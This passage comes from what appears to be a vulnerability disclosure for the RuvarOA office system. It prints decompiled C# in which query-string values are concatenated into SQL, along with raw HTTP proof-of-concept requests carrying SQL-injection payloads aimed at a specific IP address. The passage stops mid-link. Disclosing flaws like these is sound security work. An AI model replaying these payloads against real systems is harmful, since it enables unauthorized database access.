<a target="_blank" rel="noopener noreferrer" href="https://private-user-images.githubusercontent.com/18260135/302579837-fa70a45e-8c02-407a-8cf1-a57a20588545.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1Nzk4MzctZmE3MGE0NWUtOGMwMi00MDdhLThjZjEtYTU3YTIwNTg4NTQ1LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTJiYWY0MmE2ZWM5M2NjN2ZjNGVjNTE5MmRjNTljNGQwZjc3NDNiMzkzZmZmZDc4YzljZjdhZTM3MGIwYWFiMDQmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.gK7bpXKctsFHhMxPQYRG2jnVs819B-zF9XG6_FcjbQk"><img width="1062" alt="image" src="https://private-user-images.githubusercontent.com/18260135/302579837-fa70a45e-8c02-407a-8cf1-a57a20588545.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1Nzk4MzctZmE3MGE0NWUtOGMwMi00MDdhLThjZjEtYTU3YTIwNTg4NTQ1LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTJiYWY0MmE2ZWM5M2NjN2ZjNGVjNTE5MmRjNTljNGQwZjc3NDNiMzkzZmZmZDc4YzljZjdhZTM3MGIwYWFiMDQmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.gK7bpXKctsFHhMxPQYRG2jnVs819B-zF9XG6_FcjbQk" style="max-width: 100%;"></a>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">Vulnerability analysis</h4><a id="user-content-vulnerability-analysis-9" class="anchor" aria-label="Permalink: Vulnerability analysis" href="#vulnerability-analysis-9"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto">function wf_template_child_field_list within the DLL file /RuvarOA/bin/SysManage.dll</p>
<pre><code>    {
        if (!((Control)this).Page.IsPostBack)
        {
            txt_template_id.Text = ((Page)this).Request.QueryString["template_id"];
            initField();
            ((WebControl)btnSave).Attributes["onclick"] = "return checkSave();";
        }
    }

....
DataView dataView = SqlHelper.QueryView("select * from office_missive_template_child_fields where template_id=" + txt_template_id.Text);

</code></pre>
<p dir="auto">The direct use of <code>Request.QueryString["template_id"]</code> to retrieve a value and then concatenate it into an SQL statement has resulted in an SQL injection vulnerability.</p>
<div class="markdown-heading" dir="auto"><h3 class="heading-element" dir="auto">sys_blogtemplate_new.aspx</h3><a id="user-content-sys_blogtemplate_newaspx" class="anchor" aria-label="Permalink: sys_blogtemplate_new.aspx" href="#sys_blogtemplate_newaspx"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">path</h4><a id="user-content-path-10" class="anchor" aria-label="Permalink: path" href="#path-10"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">SysManage/sys_blogtemplate_new.aspx</p>
</blockquote>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">POC</h4><a id="user-content-poc-10" class="anchor" aria-label="Permalink: POC" href="#poc-10"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<pre><code>GET /SysManage/sys_blogtemplate_new.aspx?id=@@version HTTP/1.1
Host: 112.74.79.113:8000
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.4103.116 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-HK;q=0.8,zh-TW;q=0.7,zh-CN;q=0.6,zh;q=0.5
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7


</code></pre>
<a target="_blank" rel="noopener noreferrer" href="https://private-user-images.githubusercontent.com/18260135/302580620-e3197b1e-853b-4c46-afec-d6d19c95fedb.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1ODA2MjAtZTMxOTdiMWUtODUzYi00YzQ2LWFmZWMtZDZkMTljOTVmZWRiLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTYwZDA2NWQxY2I1NWY0NzU2ODhjYzQ0NDViNTIyZjUwOWE1OWQ1NWM2NzY3MWIyODgzZTY3MDM4Yjk4M2RlZDAmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.z6HcfPF8DPX0No579LEC36oSNbqCt15jU1h4X-EaIDk"><img width="1063" alt="image" src="https://private-user-images.githubusercontent.com/18260135/302580620-e3197b1e-853b-4c46-afec-d6d19c95fedb.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1ODA2MjAtZTMxOTdiMWUtODUzYi00YzQ2LWFmZWMtZDZkMTljOTVmZWRiLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTYwZDA2NWQxY2I1NWY0NzU2ODhjYzQ0NDViNTIyZjUwOWE1OWQ1NWM2NzY3MWIyODgzZTY3MDM4Yjk4M2RlZDAmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.z6HcfPF8DPX0No579LEC36oSNbqCt15jU1h4X-EaIDk" style="max-width: 100%;"></a>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">Vulnerability analysis</h4><a id="user-content-vulnerability-analysis-10" class="anchor" aria-label="Permalink: Vulnerability analysis" href="#vulnerability-analysis-10"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto">function sys_blogtemplate_new within the DLL file /RuvarOA/bin/SysManage.dll</p>
<pre><code>using System;
using System.Data;
using System.Data.Common;
using System.Data.SqlClient;
using System.Text;
using System.Web.UI;
using System.Web.UI.HtmlControls;
using System.Web.UI.WebControls;
using Lib;

namespace SysManage;

public class sys_blogtemplate_new : Page
{
    protected HtmlForm form1;

    protected TextBox txt_blog_title;

    protected Button btnSave;

    protected Button btnDelete;

    protected TextBox txt_blog_content;

    protected TextBox txt_id;

    protected void Page_Load(object sender, EventArgs e)
    {
        if (!((Page)this).IsPostBack)
        {
            txt_id.Text = ((Page)this).Request.QueryString["id"];
            if (Validate.isNullOrSpace(txt_id.Text))
            {
                txt_id.Text = "0";
            }
            DataView dataView = SqlHelper.QueryView("select top 1 * from self_worklog_template where id=" + txt_id.Text);
            if (dataView.Count &gt; 0)
            {
                txt_blog_content.Text = dataView[0]["blog_content"].ToString();
                txt_blog_title.Text = dataView[0]["blog_title"].ToString();
            }
            dataView.Dispose();
            ((WebControl)btnSave).Attributes["onclick"] = "return Check();";
            ((WebControl)btnDelete).Attributes["onclick"] = "return confirm('确定要删除吗？');";
        }
    }

</code></pre>
<p dir="auto">The direct use of <code>Request.QueryString["id"]</code> to retrieve a value and then concatenate it into an SQL statement has resulted in an SQL injection vulnerability.</p>
<div class="markdown-heading" dir="auto"><h3 class="heading-element" dir="auto">MF.aspx</h3><a id="user-content-mfaspx" class="anchor" aria-label="Permalink: MF.aspx" href="#mfaspx"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">path</h4><a id="user-content-path-11" class="anchor" aria-label="Permalink: path" href="#path-11"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">WebUtility/MF.aspx</p>
</blockquote>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">POC</h4><a id="user-content-poc-11" class="anchor" aria-label="Permalink: POC" href="#poc-11"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<pre><code>POST /WebUtility/MF.aspx HTTP/1.1
Host: 112.74.79.113:8000
Content-Length: 187
Cache-Control: max-age=0
Origin: http://112.74.79.113:8000
DNT: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5807.225 Safari/537.36 Edg/112.0.1791.33
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://112.74.79.113:8000/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,zh-HK;q=0.8,zh-TW;q=0.7,zh-CN;q=0.6,zh;q=0.5
Connection: close

__VIEWSTATE=%2FwEPDwUKMTQzODQ2ODU2NGRkIOnIdBvx8FdC98ZQVziWZAsTeOJOxTvwmwGbcAdrOUw%3D&amp;tbTable=1'+and+(select+@@version)&gt;0+--+&amp;tbPageID=1&amp;btnMake=%E7%94%9F%E6%88%90%E8%AF%AD%E5%8F%A5&amp;tbSql=
</code></pre>
<a target="_blank" rel="noopener noreferrer" href="https://private-user-images.githubusercontent.com/18260135/302581385-d4928788-4a2e-4765-8b4e-9c529cda3a8d.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1ODEzODUtZDQ5Mjg3ODgtNGEyZS00NzY1LThiNGUtOWM1MjljZGEzYThkLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTY5MDkwNTIxMTFjNmMxZjk5YzRmYzc0YzM4M2FlZDkyZTE4NTljN2M4NjNhNGQyNTkzNjg0Zjk3Mzc4ZTUyZjcmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.-H1JhZFy5r0Dd9rngNYC7f1orkb2skobtQvpGLTfhYs"><img width="1062" alt="image" src="https://private-user-images.githubusercontent.com/18260135/302581385-d4928788-4a2e-4765-8b4e-9c529cda3a8d.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1ODEzODUtZDQ5Mjg3ODgtNGEyZS00NzY1LThiNGUtOWM1MjljZGEzYThkLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTY5MDkwNTIxMTFjNmMxZjk5YzRmYzc0YzM4M2FlZDkyZTE4NTljN2M4NjNhNGQyNTkzNjg0Zjk3Mzc4ZTUyZjcmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.-H1JhZFy5r0Dd9rngNYC7f1orkb2skobtQvpGLTfhYs" style="max-width: 100%;"></a>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">Vulnerability analysis</h4><a id="user-content-vulnerability-analysis-11" class="anchor" aria-label="Permalink: Vulnerability analysis" href="#vulnerability-analysis-11"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto">function MakeSql within the DLL file /RuvarOA/bin/WebUtility.dll</p>
<pre><code>protected void Page_Load(object sender, EventArgs e)
{
    if (!((Page)this).IsPostBack)
    {
        tbTable.Text = ((Page)this).Request.QueryString["table"];
        if (tbTable.Text != "")
        {
            MakeSql();
        }
    }
}

public void MakeSql()
{
    StringBuilder stringBuilder = new StringBuilder();
    DataView dataView = SqlHelper.QueryView("select * from information_schema.columns where table_name='" + tbTable.Text + "' order by ORDINAL_POSITION ASC ");
    for (int i = 0; i &lt; dataView.Count; i++)
    {
        stringBuilder.Append(" if not exists(select * from sys_base_field where table_name='" + tbTable.Text + "' and field_name='" + dataView[i]["COLUMN_NAME"].ToString() + "')  insert into sys_base_field(table_name,field_name,field_caption,field_type,field_length,field_order,field_sort,field_show,field_search) values('" + tbTable.Text + "','" + dataView[i]["COLUMN_NAME"].ToString() + "','" + dataView[i]["COLUMN_NAME"].ToString() + "','" + dataView[i]["DATA_TYPE"].ToString() + "','" + dataView[i]["CHARACTER_OCTET_LENGTH"].ToString() + "'," + (i + 10) + ",1,1,1) \n else update sys_base_field set field_type='" + dataView[i]["DATA_TYPE"].ToString() + "',field_length='" + dataView[i]["CHARACTER_OCTET_LENGTH"].ToString() + "' where table_name='" + tbTable.Text + "' and field_name='" + dataView[i]["COLUMN_NAME"].ToString() + "' \n");
    }
    tbSql.Text = stringBuilder.ToString();
    dataView.Dispose();
}
</code></pre>
<p dir="auto">The direct use of <code>Request.QueryString["table"]</code> to retrieve a value and then concatenate it into an SQL statement has resulted in an SQL injection vulnerability.</p>
<div class="markdown-heading" dir="auto"><h3 class="heading-element" dir="auto">wf_work_print.aspx</h3><a id="user-content-wf_work_printaspx" class="anchor" aria-label="Permalink: wf_work_print.aspx" href="#wf_work_printaspx"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">path</h4><a id="user-content-path-12" class="anchor" aria-label="Permalink: path" href="#path-12"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">WorkFlow/wf_work_print.aspx</p>
</blockquote>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">POC</h4><a id="user-content-poc-12" class="anchor" aria-label="Permalink: POC" href="#poc-12"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<pre><code>GET /WorkFlow/wf_work_print.aspx?idlist=@@version HTTP/1.1
Host: 112.74.79.113:8000
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5807.225 Safari/537.36 Edg/112.0.1791.33
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,zh-HK;q=0.8,zh-TW;q=0.7,zh-CN;q=0.6,zh;q=0.5
Connection: close


</code></pre>
<a target="_blank" rel="noopener noreferrer" href="https://private-user-images.githubusercontent.com/18260135/302583014-1df11c8c-a3df-4d32-9615-1c3d308a4b2a.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1ODMwMTQtMWRmMTFjOGMtYTNkZi00ZDMyLTk2MTUtMWMzZDMwOGE0YjJhLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWFkNzI2MTc2ZDVhM2IzN2VlYzVjOTBiYTQ3MzY2NzY1YjQ5NDRiOTdlNDI0OWZlMjM2OGE0NTI0YTViNmQwMjUmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.K3Gp51jULlsBLt_-Vu8vJEa